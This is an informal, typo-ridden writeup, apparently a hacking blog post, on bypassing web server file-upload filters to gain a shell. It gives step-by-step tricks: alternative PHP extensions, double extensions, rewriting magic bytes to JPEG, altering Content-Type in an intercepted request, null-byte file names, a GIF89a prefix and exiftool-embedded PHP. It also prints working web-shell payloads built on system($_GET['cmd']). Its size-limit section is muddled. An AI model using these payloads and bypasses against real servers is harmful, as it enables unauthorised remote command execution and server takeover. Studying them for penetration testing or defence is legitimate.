
## hi all in this <write up> by : alien0here /insta:alien.php
### so in this writeup we gona talk about :
* how t bypass file upload (client side / server side) filtering
> so let's gooo !
  * first what is a file upload vulnerabilitie
> file upload vuln are when a web server allows users to upload files to its filesystem whitout analizing him 
> this vuln is critical because you can get a shell and controle the server

![](https://miro.medium.com/max/1024/1*7cRFfyAghurUVTK5lk3iXg.png)


so let's back to our main suject
*  from the basics baypass to the server side filtration is changing the extension
> the extension here are alternative extensions that can be used to get around blacklist filters. Here are some extensions for PHP files:
```
.pht, .phtml, .php3, .php4, .php5, .php6, .phtml , .pht , .phar


```
* bypassing whitelists

> and we can use another way is doing double extensions for example if the server allow us to upload image whit .jpg extension so how we can bypass this is easy just follow this steps:
![](https://beaglesecurity.com/blog/images/insufileuplod.png)
```
1-mv shell.php shell.jpg.php
2- upload this revshell whit double extension
```
* onther way is editing the hexadecimal to onther format hexadecimal
![](https://img.wonderhowto.com/img/19/40/63730413103802/0/bypass-file-upload-restrictions-web-apps-get-shell.w1456.jpg)
so let's start whit a small example
> in this example this server allow us to upload jpg images and we have try all at the top TRICKS to bypass this filter but he don't work so let's use this methode
* so this tricks stund for changing the hex of the php revshell to a normamle jpg image sop let's do it
````
before changing the hex 
$ --> file revshell.php
=PHP SCRIPT, ASCII text
and add four A

````
![](https://i.imgur.com/oe434wu.png)
now let's edit it using hexeditor tool
```
$ --> hexeditor revshell.php
and changing the first line of the hex to 
FF D8 FF DB

```
![](https://i.imgur.com/2OlGKdQ.png)
and this hex (FF D8 FF DB) is JPEG raw (.jpg) so the server will not be able to stect it as a .php
```
$ ---> file revshell.php
outpout: <jpeg image data>

```
 so let's move to client side filtration and how to bypass it:
 * for bypassing this type of filtration we can use this tricks

 > intercepting the upload page and editing the content type of the revshell
 * let's start whit an example
 ```
1-active the intercept and catch the request after clicking upload
 ```
![](https://i.imgur.com/h2164Li.png)
this will be the form of the request so now change the Content-type from image/jpeg to ***text/x-php***
> onther different tricks to bypass filters
* e a null byte injection to bypass whitelist filters
(shell.php%00.jpg)
or using (shell.php\x00.jpg)

* if the server check thr content of the file you can just addd GIF89a; to your payload let's do it
> 
```
GIF89a;
<?
system($_GET['cmd'])
?>
```
or just add your payload 
> creating an image file and inserting our payload into it whit **exiftool** 
``` 
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' cul.jpg.php
```
Exiftool is a great tool to view and manipulate exif-data
and note : remenber to change the file name to vul.jpg.php
* and let's move to the content lenght validation and how to bypass it :
This type of validation can be bypassed by uploading a very short malicious code within the
uploaded file depending on the maximum size restriction on the web server
example :
```
if ($_FILES["fileToUpload"]["size"] > 30) {
2. echo "Sorry, your file is too large.";
3. } 
```
so we just need to insert a payload whit  > 30 caractere let's do it
```
<?= $_GET[x] ?>

```